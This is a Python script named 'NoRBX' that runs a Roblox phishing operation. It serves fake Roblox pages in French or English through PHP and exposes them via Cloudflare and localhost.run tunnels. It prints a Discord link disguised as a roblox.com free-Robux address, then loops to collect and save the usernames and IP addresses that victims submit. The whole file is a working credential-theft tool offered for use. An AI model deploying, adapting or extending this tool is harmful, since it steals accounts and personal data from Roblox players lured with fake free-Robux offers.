#By Loles

import os
import time
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
from pystyle import Add, Colors, Colorate, Center, Write


def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

def bgtask(command, stdout=PIPE, stderr=DEVNULL, cwd="./"):
    try:
        return Popen(command, shell=True, stdout=stdout, stderr=stderr, cwd=cwd)
    except Exception as e:
        append(e, error_file)

cf_file = "logs/cf.log"
lhr_file = "logs/lhr.log"
cf_log = open(cf_file, 'w')
lhr_log = open(lhr_file, 'w')


if os.path.isfile('server/cloudflared'):
   pass
else:
  print('\n\033[31m[Active Alert@NoRBX] Cloudflare is not installed.')
  print('\n\033[35m[Info@NoRBX] Installing cloudflare...')
  os.system("bash modules/install.sh")

def menu():
  os.system("clear")
  banner1 = (f"""

███╗░░██╗░█████╗░██████╗░██████╗░██╗░░██╗
████╗░██║██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝
██╔██╗██║██║░░██║██████╔╝██████╦╝░╚███╔╝░
██║╚████║██║░░██║██╔══██╗██╔══██╗░██╔██╗░
██║░╚███║╚█████╔╝██║░░██║██████╦╝██╔╝╚██╗
╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝ ʙʏ Nᴏᴄᴛᴜʀɴᴀʟ""")
  print(Colorate.Horizontal(Colors.red_to_white, str(banner1), 1))


  Write.Input((f"\nPress ENTER to launch NoRBX."), Colors.red_to_white, interval=0.0025)

  Write.Print(("\nWhat is your language ?"), Colors.red_to_white, interval=0.0025)
  print('')
  Write.Print(('\nFrançais = 1\nEnglish = 2.'), Colors.red_to_white, interval=0.0025)
  print('')


  num = int(Write.Input(("\n↳ "), Colors.red_to_white, interval=0.0025))



  if num == 1:
    Write.Print(('\n[Info@NoRBX] Starting server...'), Colors.red_to_white, interval=0.0025)
    print('')
    os.system("php -S localhost:8080 -t pages/roblox_fr > /dev/null 2>&1 &")
    time.sleep(2)
    Write.Print(('[Info@NoRBX] Server : ✔️'), Colors.red_to_white, interval=0.0025)
    print('')
    Write.Print(('[Info@NoRBX] Creating links...'), Colors.red_to_white, interval=0.0025)
    print('\n')
    bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
    bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
    cf_success = False
    for i in range(10):
        cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
        if cf_url != "":
            cf_success = True
            break
        time.sleep(1)
    for i in range(10):
        lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
        if lhr_url != "":
            lhr_success = True
            break
        time.sleep(1)
    Write.Print((f'[Info@NoRBX] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
    print('')
    Write.Print((f'\n[Info@NoRBX] Localhost.run {lhr_url}'), Colors.red_to_white, interval=0.0025)
    print('')

    Write.Print((f'\n[Info@NoRBX] CopyPaste for discord :\n[https://]({cf_url})[roblox.com/collabs/robux/]({cf_url})'), Colors.red_to_white, interval=0.0025)
    print('')

    Write.Print(('\n[Info@NoRBX] Waiting for data...'), Colors.red_to_white, interval=0.0025)
    print('')
    while True:
      while True:
       if os.path.isfile('pages/roblox_fr/usernames.txt'):
        Write.Print(('\n\033[Active Alert@NoRBX] Users found!'), Colors.red_to_white, interval=0.0025)
        print('')
        Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
        print('')
        os.system("cat pages/roblox_fr/usernames.txt")
        os.system("cat pages/roblox_fr/usernames.txt >> pages/roblox_fr/users_saved.txt")
        os.system("rm -rf pages/roblox_fr/usernames.txt")
        Write.Print(('\n\033[Passive Alert@NoRBX] Users saved in: users_saved.txt'), Colors.red_to_white, interval=0.0025)
        print('')
       if os.path.isfile('pages/roblox_fr/ip.txt'):
        Write.Print(('\n\033[Active Alert@NoRBX] IP found!'), Colors.red_to_white, interval=0.0025)
        print('')
        Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
        print('')
        os.system("cat pages/roblox_fr/ip.txt")
        os.system("cat pages/roblox_en/ip.txt >> pages/roblox_fr/ip_saved.txt")
        os.system("rm -rf pages/roblox_fr/ip.txt")
        Write.Print(('\n\033[Passive Alert@NoRBX] IP saved in: ip_saved.txt'), Colors.red_to_white, interval=0.0025)
        print('')
  elif num == 2:
        Write.Print(('\n[Info@NoRBX] Starting server...'), Colors.red_to_white, interval=0.0025)
        print('')
        os.system("php -S localhost:8080 -t pages/roblox_en > /dev/null 2>&1 &")
        time.sleep(2)
        Write.Print(('[Info@NoRBX] Server : ✔️'), Colors.red_to_white, interval=0.0025)
        print('')
        Write.Print(('[Info@NoRBX] Creating links...'), Colors.red_to_white, interval=0.0025)
        print('\n')
        bgtask("./server/cloudflared tunnel -url localhost:8080", stdout=cf_log, stderr=cf_log)
        bgtask("ssh -R 80:localhost:8080 nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
        cf_success = False
        for i in range(10):
            cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
            if cf_url != "":
                cf_success = True
                break
            time.sleep(1)
        for i in range(10):
            lhr_url = grep("(https://[-0-9a-z.]*.lhr.life)", lhr_file)
            if lhr_url != "":
                lhr_success = True
                break
            time.sleep(1)
        Write.Print((f'[Info@NoRBX] Link: {cf_url}'), Colors.red_to_white, interval=0.0025)
        print('')
        Write.Print((f'\n[Info@NoRBX] Localhost.run {lhr_url}'), Colors.red_to_white, interval=0.0025)
        print('')

        Write.Print((f'\n[Info@NoRBX] CopyPaste for discord :\n[https://]({cf_url})[roblox.com/collabs/robux/]({cf_url})'), Colors.red_to_white, interval=0.0025)
        print('')

        Write.Print(('\n[Info@NoRBX] Waiting for data...'), Colors.red_to_white, interval=0.0025)
        print('')
        while True:
            if os.path.isfile('pages/roblox_en/usernames.txt'):
                Write.Print(('\n\033[Active Alert@NoRBX] Users found!'), Colors.red_to_white, interval=0.0025)
                print('')
                Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
                print('')
                os.system("cat pages/roblox_en/usernames.txt")
                os.system("cat pages/roblox_en/usernames.txt >> pages/roblox_en/users_saved.txt")
                os.system("rm -rf pages/roblox_en/usernames.txt")
                Write.Print(('\n\033[Passive Alert@NoRBX] Users saved in: users_saved.txt'), Colors.red_to_white, interval=0.0025)
                print('')
            if os.path.isfile('pages/roblox_en/ip.txt'):
                Write.Print(('\n\033[Active Alert@NoRBX] IP found!'), Colors.red_to_white, interval=0.0025)
                print('')
                Write.Print(('\033'), Colors.red_to_white, interval=0.0025)
                print('')
                os.system("cat pages/roblox_en/ip.txt")
                os.system("cat pages/roblox_en/ip.txt >> pages/roblox_en/ip_saved.txt")
                os.system("rm -rf pages/roblox_en/ip.txt")
                Write.Print(('\n\033[Passive Alert@NoRBX] IP saved in: ip_saved.txt'), Colors.red_to_white, interval=0.0025)
                print('')

menu()
